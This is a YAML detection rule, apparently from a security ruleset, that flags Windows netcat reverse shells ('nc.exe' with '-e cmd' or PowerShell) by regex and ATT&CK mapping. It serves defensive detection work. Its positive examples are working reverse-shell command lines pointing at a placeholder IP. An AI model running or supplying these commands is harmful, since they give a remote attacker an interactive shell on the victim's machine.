- id: mention.revshell_netcat_windows_exec
  title: 'nc.exe -e with cmd or PowerShell'
  match:
    anchored: 'nc\.exe["'']? [^|&\n]{0,80}-[a-zA-Z]{0,5}e {0,2}["'']?(?:cmd|powershell)(?:\.exe)?\b'
  case_sensitive: false
  strength: strong
  attack: [T1059.003, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    'nc.exe host port -e cmd.exe' sends a Windows command shell over a raw socket. Windows has no built-in netcat, so
    its presence with -e is an intrusion tool. The 64-bit build nc64.exe is a separate entry.
  examples:
    positive:
      - 'C:\Windows\Temp\nc.exe 203.0.113.7 443 -e cmd.exe'
      - 'Process Create: CommandLine: "C:\ProgramData\nc.exe" -e powershell.exe 203.0.113.7 8080'
    negative:
      - 'C:\Tools\nc.exe -zv 10.0.0.5 3389'
      - 'C:\Windows\system32\cmd.exe /c ipconfig /all'

